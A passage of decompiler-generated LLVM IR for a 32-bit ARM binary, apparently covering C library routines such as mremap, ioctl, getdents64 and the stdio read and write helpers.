  store i32 %v3_101a8, i32* %v3_101ac, align 4
  %v0_101b0 = load i32, i32* %r4.global-to-local, align 4
  %v1_101b0 = add i32 %v0_101b0, 32
  %v1_101b4 = inttoptr i32 %v1_101b0 to i32*
  %v2_101b4 = load i32, i32* %v1_101b4, align 4
  %v3_101b4 = add i32 %v0_101b0, 36
  %v4_101b4 = inttoptr i32 %v3_101b4 to i32*
  %v5_101b4 = load i32, i32* %v4_101b4, align 4
  store i32 %v5_101b4, i32* %r1.global-to-local, align 4
  %v0_101b8 = load i32, i32* %r5.global-to-local, align 4
  %v1_101b8 = add i32 %v0_101b8, 56
  %v1_101bc = inttoptr i32 %v1_101b8 to i32*
  store i32 %v2_101b4, i32* %v1_101bc, align 4
  %v3_101bc = add i32 %v0_101b8, 60
  %v4_101bc = inttoptr i32 %v3_101bc to i32*
  %v5_101bc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_101bc, i32* %v4_101bc, align 4
  %v0_101c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_101c0 = add i32 %v0_101c0, 40
  %v1_101c4 = inttoptr i32 %v1_101c0 to i32*
  %v2_101c4 = load i32, i32* %v1_101c4, align 4
  %v3_101c4 = add i32 %v0_101c0, 44
  %v4_101c4 = inttoptr i32 %v3_101c4 to i32*
  %v5_101c4 = load i32, i32* %v4_101c4, align 4
  store i32 %v5_101c4, i32* %r1.global-to-local, align 4
  %v0_101c8 = load i32, i32* %r5.global-to-local, align 4
  %v1_101c8 = add i32 %v0_101c8, 64
  %v1_101cc = inttoptr i32 %v1_101c8 to i32*
  store i32 %v2_101c4, i32* %v1_101cc, align 4
  %v3_101cc = add i32 %v0_101c8, 68
  %v4_101cc = inttoptr i32 %v3_101cc to i32*
  %v5_101cc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_101cc, i32* %v4_101cc, align 4
  %v0_101d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_101d0 = add i32 %v0_101d0, 48
  %v1_101d4 = inttoptr i32 %v1_101d0 to i32*
  %v2_101d4 = load i32, i32* %v1_101d4, align 4
  %v3_101d4 = add i32 %v0_101d0, 52
  %v4_101d4 = inttoptr i32 %v3_101d4 to i32*
  %v5_101d4 = load i32, i32* %v4_101d4, align 4
  store i32 %v5_101d4, i32* %r1.global-to-local, align 4
  %v1_101d8 = add i32 %v0_101d0, 8
  %v2_101d8 = inttoptr i32 %v1_101d8 to i16*
  %v3_101d8 = load i16, i16* %v2_101d8, align 2
  %v4_101d8 = zext i16 %v3_101d8 to i32
  store i32 %v4_101d8, i32* %r2.global-to-local, align 4
  %v1_101dc = add i32 %v0_101d0, 10
  %v2_101dc = inttoptr i32 %v1_101dc to i16*
  %v3_101dc = load i16, i16* %v2_101dc, align 2
  %v4_101dc = zext i16 %v3_101dc to i32
  store i32 %v4_101dc, i32* %ip.global-to-local, align 4
  %v1_101e0 = add i32 %v0_101d0, 12
  %v2_101e0 = inttoptr i32 %v1_101e0 to i16*
  %v3_101e0 = load i16, i16* %v2_101e0, align 2
  %v4_101e0 = zext i16 %v3_101e0 to i32
  store i32 %v4_101e0, i32* %lr.global-to-local, align 4
  %v1_101e4 = add i32 %v0_101d0, 14
  %v2_101e4 = inttoptr i32 %v1_101e4 to i16*
  %v3_101e4 = load i16, i16* %v2_101e4, align 2
  %v4_101e4 = zext i16 %v3_101e4 to i32
  store i32 %v4_101e4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_101f0 = load i32, i32* %r5.global-to-local, align 4
  %v1_101f0 = add i32 %v0_101f0, 72
  %v1_101f4 = inttoptr i32 %v1_101f0 to i32*
  store i32 %v2_101d4, i32* %v1_101f4, align 4
  %v3_101f4 = add i32 %v0_101f0, 76
  %v4_101f4 = inttoptr i32 %v3_101f4 to i32*
  %v5_101f4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_101f4, i32* %v4_101f4, align 4
  %v0_101f8 = load i32, i32* %r5.global-to-local, align 4
  %v1_101f8 = inttoptr i32 %v0_101f8 to i32*
  %v2_101f8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v2_101f8, i32* %v1_101f8, align 4
  %v3_101f8 = add i32 %v0_101f8, 4
  %v4_101f8 = inttoptr i32 %v3_101f8 to i32*
  %v5_101f8 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v5_101f8, i32* %v4_101f8, align 4
  %v0_101fc = load i32, i32* %r6.global-to-local, align 4
  %v1_101fc = load i32, i32* %r5.global-to-local, align 4
  %v2_101fc = add i32 %v1_101fc, 32
  %v3_101fc = inttoptr i32 %v2_101fc to i32*
  store i32 %v0_101fc, i32* %v3_101fc, align 4
  %v0_10200 = load i32, i32* %r7.global-to-local, align 4
  %v1_10200 = load i32, i32* %r5.global-to-local, align 4
  %v2_10200 = add i32 %v1_10200, 36
  %v3_10200 = inttoptr i32 %v2_10200 to i32*
  store i32 %v0_10200, i32* %v3_10200, align 4
  %v0_10204 = load i32, i32* %r2.global-to-local, align 4
  %v1_10204 = load i32, i32* %r5.global-to-local, align 4
  %v2_10204 = add i32 %v1_10204, 16
  %v3_10204 = inttoptr i32 %v2_10204 to i32*
  store i32 %v0_10204, i32* %v3_10204, align 4
  %v0_10208 = load i32, i32* %ip.global-to-local, align 4
  %v1_10208 = load i32, i32* %r5.global-to-local, align 4
  %v2_10208 = add i32 %v1_10208, 20
  %v3_10208 = inttoptr i32 %v2_10208 to i32*
  store i32 %v0_10208, i32* %v3_10208, align 4
  %v0_1020c = load i32, i32* %lr.global-to-local, align 4
  %v1_1020c = load i32, i32* %r5.global-to-local, align 4
  %v2_1020c = add i32 %v1_1020c, 24
  %v3_1020c = inttoptr i32 %v2_1020c to i32*
  store i32 %v0_1020c, i32* %v3_1020c, align 4
  %v0_10210 = load i32, i32* %r4.global-to-local, align 4
  %v1_10210 = load i32, i32* %r5.global-to-local, align 4
  %v2_10210 = add i32 %v1_10210, 28
  %v3_10210 = inttoptr i32 %v2_10210 to i32*
  store i32 %v0_10210, i32* %v3_10210, align 4
  ret i32 %v2_101d4

; uselistorder directives
  uselistorder i32 %v0_101d0, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 68, { 0, 1, 4, 2, 3 }
  uselistorder i32 60, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 88, { 4, 0, 1, 2, 3 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10254, label %dec_label_pc_10244

dec_label_pc_10244:                               ; preds = %entry
  %v0_10244 = call i32 @__GI___errno_location()
  %v0_10248 = load i32, i32* %r4.global-to-local, align 4
  %v1_10248 = sub i32 0, %v0_10248
  %v2_1024c = inttoptr i32 %v0_10244 to i32*
  store i32 %v1_10248, i32* %v2_1024c, align 4
  br label %dec_label_pc_10254

dec_label_pc_10254:                               ; preds = %entry, %dec_label_pc_10244
  %v1_1025c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_10244 ]
  ret i32 %v1_1025c

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10254, { 1, 0 }
}

define i32 @ioctl() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_10260 = load i32, i32* @r3, align 4
  store i32 %v9_10260, i32* %stack_var_-4, align 4
  %v2_1026c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1026c, i32* @r3, align 4
  %v0_10284 = load i32, i32* @r0, align 4
  store i32 %v0_10284, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10284, -4095
  br i1 %tmp, label %dec_label_pc_102a0, label %dec_label_pc_10290

dec_label_pc_10290:                               ; preds = %entry
  %v0_10290 = call i32 @__GI___errno_location()
  %v0_10294 = load i32, i32* %r7.global-to-local, align 4
  %v1_10294 = sub i32 0, %v0_10294
  store i32 %v1_10294, i32* @r3, align 4
  %v2_10298 = inttoptr i32 %v0_10290 to i32*
  store i32 %v1_10294, i32* %v2_10298, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_102a0

dec_label_pc_102a0:                               ; preds = %entry, %dec_label_pc_10290
  %v0_102a0 = phi i32 [ %v0_10284, %entry ], [ -1, %dec_label_pc_10290 ]
  ret i32 %v0_102a0

; uselistorder directives
  uselistorder i32 %v0_10284, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_102a0, { 1, 0 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_102b8 = load i32, i32* @r4, align 4
  %v6_102b8 = load i32, i32* @r5, align 4
  %v12_102b8 = load i32, i32* @r7, align 4
  %v1_102bc = add i32 %arg3, 14
  %v2_102c4 = ptrtoint i32* %stack_var_-72 to i32
  %v1_102c8 = and i32 %v1_102bc, -8
  %v2_102cc = sub i32 %v2_102c4, %v1_102c8
  %v1_102d0 = add i32 %v2_102cc, 8
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %v1_102d0, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp25 = icmp ult i32 %arg1, -4095
  br i1 %tmp25, label %dec_label_pc_1030c, label %dec_label_pc_102f8

dec_label_pc_102f8:                               ; preds = %entry
  %v0_102f8 = call i32 @__GI___errno_location()
  %v0_102fc = load i32, i32* %r4.global-to-local, align 4
  %v1_102fc = sub i32 0, %v0_102fc
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_10304 = inttoptr i32 %v0_102f8 to i32*
  store i32 %v1_102fc, i32* %v2_10304, align 4
  %v0_10314.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10314

dec_label_pc_1030c:                               ; preds = %entry
  br i1 false, label %dec_label_pc_10314, label %dec_label_pc_1031c

dec_label_pc_10314:                               ; preds = %dec_label_pc_1030c, %dec_label_pc_102f8
  %v0_10314 = phi i32 [ -1, %dec_label_pc_1030c ], [ %v0_10314.pre, %dec_label_pc_102f8 ]
  store i32 %v0_10314, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_103e8

dec_label_pc_1031c:                               ; preds = %dec_label_pc_1030c
  %v2_1031c = add i32 %v1_102d0, %arg1
  %v2_10320 = add i32 %tmp, %arg3
  store i32 %v2_10320, i32* @ip, align 4
  store i32 %v1_102d0, i32* @r7, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_103d0

dec_label_pc_1033c:                               ; preds = %dec_label_pc_103d0
  %v1_1033c = add i32 %v0_10390, 16
  %v2_1033c = inttoptr i32 %v1_1033c to i16*
  %v3_1033c = load i16, i16* %v2_1033c, align 2
  %v4_1033c = zext i16 %v3_1033c to i32
  %v1_10340 = add nuw nsw i32 %v4_1033c, 7
  %v1_10344 = and i32 %v1_10340, 131064
  store i32 %v1_10344, i32* %r2.global-to-local, align 4
  %v2_1034c = add i32 %v1_10344, %v0_10398
  store i32 %v2_1034c, i32* %r8.global-to-local, align 4
  %tmp26 = icmp ugt i32 %v2_1034c, %v2_10320
  br i1 %tmp26, label %dec_label_pc_10358, label %dec_label_pc_1038c

dec_label_pc_10358:                               ; preds = %dec_label_pc_1033c
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_10360 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_10360, i32* %r2.global-to-local, align 4
  %v0_10364 = load i32, i32* %sl.global-to-local, align 4
  %v1_10368 = load i32, i32* @sp, align 4
  %v2_10368 = inttoptr i32 %v1_10368 to i32*
  store i32 0, i32* %v2_10368, align 4
  %v4_1036c = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_10360, i32 %v0_10364)
  %v0_10370 = load i32, i32* @r5, align 4
  %v1_10370 = load i32, i32* %r6.global-to-local, align 4
  %v9_10370 = icmp eq i32 %v0_10370, %v1_10370
  br i1 %v9_10370, label %dec_label_pc_10378, label %dec_label_pc_103e4

dec_label_pc_10378:                               ; preds = %dec_label_pc_10358
  %v0_10378 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v2_10384 = inttoptr i32 %v0_10378 to i32*
  store i32 22, i32* %v2_10384, align 4
  %v0_103e8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_103e8

dec_label_pc_1038c:                               ; preds = %dec_label_pc_1033c
  %v1_1038c = inttoptr i32 %v0_10390 to i32*
  %v2_1038c = load i32, i32* %v1_1038c, align 4
  %v3_1038c = add i32 %v0_10390, 4
  %v4_1038c = inttoptr i32 %v3_1038c to i32*
  %v5_1038c = load i32, i32* %v4_1038c, align 4
  store i32 %v5_1038c, i32* %r4.global-to-local, align 4
  %v1_10390 = add i32 %v0_10390, 8
  store i32 %v1_10390, i32* %sb.global-to-local, align 4
  %v1_10394 = inttoptr i32 %v1_10390 to i32*
  %v2_10394 = load i32, i32* %v1_10394, align 4
  store i32 %v2_10394, i32* %sb.global-to-local, align 4
  %v3_10394 = add i32 %v0_10390, 12
  %v4_10394 = inttoptr i32 %v3_10394 to i32*
  %v5_10394 = load i32, i32* %v4_10394, align 4
  store i32 %v5_10394, i32* %sl.global-to-local, align 4
  %v1_10398 = inttoptr i32 %v0_10398 to i32*
  store i32 %v2_1038c, i32* %v1_10398, align 4
  %v3_10398 = add i32 %v0_10398, 4
  %v4_10398 = inttoptr i32 %v3_10398 to i32*
  %v5_10398 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_10398, i32* %v4_10398, align 4
  %v0_1039c = load i32, i32* @r7, align 4
  %v1_1039c = add i32 %v0_1039c, 8
  %v1_103a0 = inttoptr i32 %v1_1039c to i32*
  %v2_103a0 = load i32, i32* %v1_103a0, align 4
  %v3_103a0 = add i32 %v0_1039c, 12
  %v4_103a0 = inttoptr i32 %v3_103a0 to i32*
  %v5_103a0 = load i32, i32* %v4_103a0, align 4
  store i32 %v5_103a0, i32* @r4, align 4
  %v1_103a4 = load i32, i32* @r5, align 4
  %v2_103a4 = add i32 %v1_103a4, 8
  %v3_103a4 = inttoptr i32 %v2_103a4 to i32*
  store i32 %v2_103a0, i32* %v3_103a4, align 4
  %v0_103a8 = load i32, i32* @r4, align 4
  %v1_103a8 = load i32, i32* @r5, align 4
  %v2_103a8 = add i32 %v1_103a8, 12
  %v3_103a8 = inttoptr i32 %v2_103a8 to i32*
  store i32 %v0_103a8, i32* %v3_103a8, align 4
  %v0_103ac = load i32, i32* %r2.global-to-local, align 4
  %v1_103ac = trunc i32 %v0_103ac to i16
  %v2_103ac = load i32, i32* @r5, align 4
  %v3_103ac = add i32 %v2_103ac, 16
  %v4_103ac = inttoptr i32 %v3_103ac to i16*
  store i16 %v1_103ac, i16* %v4_103ac, align 2
  %v0_103b0 = load i32, i32* @r7, align 4
  %v1_103b0 = add i32 %v0_103b0, 18
  %v2_103b0 = inttoptr i32 %v1_103b0 to i8*
  %v3_103b0 = load i8, i8* %v2_103b0, align 1
  %v4_103b0 = zext i8 %v3_103b0 to i32
  store i32 %v4_103b0, i32* @r3, align 4
  %v2_103b4 = load i32, i32* @r5, align 4
  %v3_103b4 = add i32 %v2_103b4, 18
  %v4_103b4 = inttoptr i32 %v3_103b4 to i8*
  store i8 %v3_103b0, i8* %v4_103b4, align 1
  %v0_103b8 = load i32, i32* @r7, align 4
  %v1_103b8 = add i32 %v0_103b8, 16
  %v2_103b8 = inttoptr i32 %v1_103b8 to i16*
  %v3_103b8 = load i16, i16* %v2_103b8, align 2
  %v4_103b8 = zext i16 %v3_103b8 to i32
  %v1_103bc = add nsw i32 %v4_103b8, -19
  store i32 %v1_103bc, i32* @r2, align 4
  %v0_103c0 = call i32 @memcpy()
  %v0_103c4 = load i32, i32* @r7, align 4
  %v1_103c4 = add i32 %v0_103c4, 16
  %v2_103c4 = inttoptr i32 %v1_103c4 to i16*
  %v3_103c4 = load i16, i16* %v2_103c4, align 2
  %v4_103c4 = zext i16 %v3_103c4 to i32
  %v0_103c8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_103c8, i32* @r5, align 4
  %v2_103cc = add i32 %v4_103c4, %v0_103c4
  store i32 %v2_103cc, i32* @r7, align 4
  br label %dec_label_pc_103d0

dec_label_pc_103d0:                               ; preds = %dec_label_pc_1031c, %dec_label_pc_1038c
  %v0_10398 = phi i32 [ %tmp, %dec_label_pc_1031c ], [ %v0_103c8, %dec_label_pc_1038c ]
  %v0_10390 = phi i32 [ %v1_102d0, %dec_label_pc_1031c ], [ %v2_103cc, %dec_label_pc_1038c ]
  %v3_103d4 = icmp ult i32 %v0_10390, %v2_1031c
  %v1_103d8 = add i32 %v0_10398, 19
  store i32 %v1_103d8, i32* @r0, align 4
  %v1_103dc = add i32 %v0_10390, 19
  store i32 %v1_103dc, i32* @r1, align 4
  br i1 %v3_103d4, label %dec_label_pc_1033c, label %dec_label_pc_103e4.loopexit

dec_label_pc_103e4.loopexit:                      ; preds = %dec_label_pc_103d0
  %v0_103e4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_103e4

dec_label_pc_103e4:                               ; preds = %dec_label_pc_103e4.loopexit, %dec_label_pc_10358
  %v1_103e4 = phi i32 [ %v0_10398, %dec_label_pc_103e4.loopexit ], [ %v0_10370, %dec_label_pc_10358 ]
  %v0_103e4 = phi i32 [ %v0_103e4.pre, %dec_label_pc_103e4.loopexit ], [ %v1_10370, %dec_label_pc_10358 ]
  %v2_103e4 = sub i32 %v1_103e4, %v0_103e4
  store i32 %v2_103e4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_103e8

dec_label_pc_103e8:                               ; preds = %dec_label_pc_10378, %dec_label_pc_10314, %dec_label_pc_103e4
  %v0_103e8 = phi i32 [ %v0_103e8.pre, %dec_label_pc_10378 ], [ %v0_10314, %dec_label_pc_10314 ], [ %v2_103e4, %dec_label_pc_103e4 ]
  store i32 %v3_102b8, i32* %r4.global-to-local, align 4
  store i32 %v6_102b8, i32* @r5, align 4
  store i32 %v12_102b8, i32* @r7, align 4
  ret i32 %v0_103e8

; uselistorder directives
  uselistorder i32 %v0_10390, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_10398, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_102d0, { 1, 2, 0, 3 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_103e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_103d0, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_103f8 = load i32, i32* @r4, align 4
  store i32 %v3_103f8, i32* %stack_var_-12, align 4
  %v0_103fc = load i32, i32* %r0.global-to-local, align 4
  %v1_103fc = inttoptr i32 %v0_103fc to i16*
  %v2_103fc = load i16, i16* %v1_103fc, align 2
  %v3_103fc = zext i16 %v2_103fc to i32
  %v1_10400 = and i32 %v3_103fc, 4
  store i32 %v1_10400, i32* %r5.global-to-local, align 4
  %v2_10400 = icmp eq i32 %v1_10400, 0
  store i32 %v0_103fc, i32* %r4.global-to-local, align 4
  br i1 %v2_10400, label %dec_label_pc_10414, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_10414:                               ; preds = %entry
  %v1_10414 = icmp slt i32 %arg2, 0
  br i1 %v1_10414, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_10414
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_10414, %bb18
  %v1_1041c = add i32 %v0_103fc, 4
  %v2_1041c = inttoptr i32 %v1_1041c to i32*
  %v3_1041c = load i32, i32* %v2_1041c, align 4
  store i32 %v3_1041c, i32* %r0.global-to-local, align 4
  %v1_10420 = call i32 @__GI_read(i32 %v3_1041c)
  store i32 %v1_10420, i32* %r0.global-to-local, align 4
  %v5_10428 = icmp sgt i32 %v1_10420, 0
  br i1 %v5_10428, label %.thread7, label %dec_label_pc_1042c

dec_label_pc_1042c:                               ; preds = %bb19
  %v2_10424 = icmp eq i32 %v1_10420, 0
  %v0_1042c = load i32, i32* %r4.global-to-local, align 4
  %v1_1042c = inttoptr i32 %v0_1042c to i16*
  %v2_1042c = load i16, i16* %v1_1042c, align 2
  br i1 %v2_10424, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_1042c
  %v2_10430 = or i16 %v2_1042c, 4
  store i16 %v2_10430, i16* %v1_1042c, align 2
  %v1_1044c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_1042c
  %v2_10434 = or i16 %v2_1042c, 8
  store i16 %v2_10434, i16* %v1_1042c, align 2
  %v1_10440 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_10440, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_1044c = phi i32 [ %v1_1044c.pre, %bb20 ], [ 0, %bb ], [ %v1_10420, %bb19 ], [ %v1_10440, %bb21 ]
  %v2_10448 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10448, i32* @r4, align 4
  ret i32 %v1_1044c

; uselistorder directives
  uselistorder i16 %v2_1042c, { 1, 0 }
  uselistorder i32 %v1_10420, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_10450 = load i32, i32* @r4, align 4
  store i32 %v3_10450, i32* %stack_var_-24, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 2147483647, i32* %r8.global-to-local, align 4
  %v2_104682 = icmp eq i32 %arg3, 0
  store i1 %v2_104682, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_104682, label %dec_label_pc_104f8, label %dec_label_pc_10470

dec_label_pc_10468thread-pre-split:               ; preds = %dec_label_pc_10470
  %v3_10488 = load i32, i32* %r6.global-to-local, align 4
  %v5_10488 = add i32 %v3_10488, %v3_10480
  store i32 %v5_10488, i32* %r6.global-to-local, align 4
  %v4_1048c = load i32, i32* %r5.global-to-local, align 4
  %v5_1048c = sub i32 %v4_1048c, %v3_10480
  store i32 %v5_1048c, i32* %r5.global-to-local, align 4
  %v2_10468 = icmp eq i32 %v5_1048c, 0
  store i1 %v2_10468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10468, label %dec_label_pc_10468.dec_label_pc_104f8.loopexit_crit_edge, label %dec_label_pc_10468thread-pre-split.dec_label_pc_10470_crit_edge

dec_label_pc_10468thread-pre-split.dec_label_pc_10470_crit_edge: ; preds = %dec_label_pc_10468thread-pre-split
  %v3_10470.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_1047c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10470

dec_label_pc_10470:                               ; preds = %entry, %dec_label_pc_10468thread-pre-split.dec_label_pc_10470_crit_edge
  %v0_1047c = phi i32 [ %v0_1047c.pre, %dec_label_pc_10468thread-pre-split.dec_label_pc_10470_crit_edge ], [ %tmp, %entry ]
  %v0_10478 = phi i32 [ %v5_10488, %dec_label_pc_10468thread-pre-split.dec_label_pc_10470_crit_edge ], [ %arg2, %entry ]
  %v3_10470 = phi i32 [ %v3_10470.pre, %dec_label_pc_10468thread-pre-split.dec_label_pc_10470_crit_edge ], [ 2147483647, %entry ]
  %v0_10474.in = phi i32 [ %v5_1048c, %dec_label_pc_10468thread-pre-split.dec_label_pc_10470_crit_edge ], [ %arg3, %entry ]
  %v3_10474 = phi i32 [ %v5_1048c, %dec_label_pc_10468thread-pre-split.dec_label_pc_10470_crit_edge ], [ %arg3, %entry ]
  %v0_10474 = icmp slt i32 %v0_10474.in, 0
  %storemerge = select i1 %v0_10474, i32 %v3_10470, i32 %v3_10474
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 %v0_10478, i32* %r1.global-to-local, align 4
  %v1_1047c = add i32 %v0_1047c, 4
  %v2_1047c = inttoptr i32 %v1_1047c to i32*
  %v3_1047c = load i32, i32* %v2_1047c, align 4
  %v3_10480 = call i32 @__GI_write(i32 %v3_1047c, i32 %v0_10478)
  %v1_10484 = icmp slt i32 %v3_10480, 0
  %v2_10484 = icmp eq i32 %v3_10480, 0
  store i1 %v2_10484, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_10484, label %dec_label_pc_10494, label %dec_label_pc_10468thread-pre-split

dec_label_pc_10494:                               ; preds = %dec_label_pc_10470
  %v0_10494 = load i32, i32* %r4.global-to-local, align 4
  %v1_10494 = inttoptr i32 %v0_10494 to i16*
  %v2_10494 = load i16, i16* %v1_10494, align 2
  %v3_10494 = zext i16 %v2_10494 to i32
  store i32 %v3_10494, i32* %r3.global-to-local, align 4
  %v1_10498 = add i32 %v0_10494, 8
  store i32 %v1_10498, i32* %r1.global-to-local, align 4
  %v1_1049c = inttoptr i32 %v1_10498 to i32*
  %v2_1049c = load i32, i32* %v1_1049c, align 4
  store i32 %v2_1049c, i32* %r1.global-to-local, align 4
  %v3_1049c = add i32 %v0_10494, 12
  %v4_1049c = inttoptr i32 %v3_1049c to i32*
  %v5_1049c = load i32, i32* %v4_1049c, align 4
  %v1_104a0 = or i32 %v3_10494, 8
  store i32 %v1_104a0, i32* %r3.global-to-local, align 4
  %v2_104a4 = sub i32 %v5_1049c, %v2_1049c
  store i32 %v2_104a4, i32* %r2.global-to-local, align 4
  %v9_104a4 = icmp eq i32 %v5_1049c, %v2_1049c
  store i1 %v9_104a4, i1* %cpsr_z.global-to-local, align 1
  %v1_104a8 = trunc i32 %v1_104a0 to i16
  store i16 %v1_104a8, i16* %v1_10494, align 2
  br i1 %v9_104a4, label %dec_label_pc_10494.dec_label_pc_104f4_crit_edge, label %dec_label_pc_104b0

dec_label_pc_10494.dec_label_pc_104f4_crit_edge:  ; preds = %dec_label_pc_10494
  %v0_104f4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_104f4

dec_label_pc_104b0:                               ; preds = %dec_label_pc_10494
  %v0_104b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_104b0 = load i32, i32* %r5.global-to-local, align 4
  %v3_104b0 = icmp ult i32 %v0_104b0, %v1_104b0
  %v9_104b0 = icmp eq i32 %v0_104b0, %v1_104b0
  store i1 %v9_104b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_104b0, label %.preheader, label %bb23

bb23:                                             ; preds = %dec_label_pc_104b0
  store i32 %v1_104b0, i32* %r2.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_104b0, %bb23
  %v2_104c4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb24

bb24:                                             ; preds = %.preheader, %dec_label_pc_104d8
  %v2_104c4 = phi i32 [ %v2_104c4.pre, %.preheader ], [ %v1_104dc, %dec_label_pc_104d8 ]
  %v0_104b8 = load i32, i32* %r6.global-to-local, align 4
  %v1_104b8 = inttoptr i32 %v0_104b8 to i8*
  %v2_104b8 = load i8, i8* %v1_104b8, align 1
  %v3_104b8 = zext i8 %v2_104b8 to i32
  store i32 %v3_104b8, i32* %r3.global-to-local, align 4
  %v7_104bc = icmp eq i8 %v2_104b8, 10
  store i1 %v7_104bc, i1* %cpsr_z.global-to-local, align 1
  %v1_104c0 = add i32 %v0_104b8, 1
